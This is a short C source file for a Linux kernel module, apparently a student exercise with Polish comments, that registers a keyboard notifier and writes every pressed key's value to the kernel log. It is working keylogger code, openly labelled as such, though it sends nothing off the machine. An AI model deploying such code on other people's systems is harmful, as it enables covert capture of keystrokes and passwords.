#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>

// Funkcja obslugujaca nacisniecia klawiszy
int keylogger_callback(struct notifier_block *nblock, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) { 
        printk(KERN_INFO "Nacisniety klawisz: %d\n", param->value); 
    }

    return NOTIFY_OK;
}

// Struktura callback
static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_callback
};

// Funkcja inicjalizacyjna
static int __init keylogger_init(void) {
    printk(KERN_INFO "Modul zaladowany\n");
    register_keyboard_notifier(&keylogger_nb); // Rejestracja callback
    return 0;
}

// Funkcja konczaca
static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&keylogger_nb); // Wyrejestrowanie callback
    printk(KERN_INFO "Modul wyladowany\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Prosty keylogger - modul jadra");
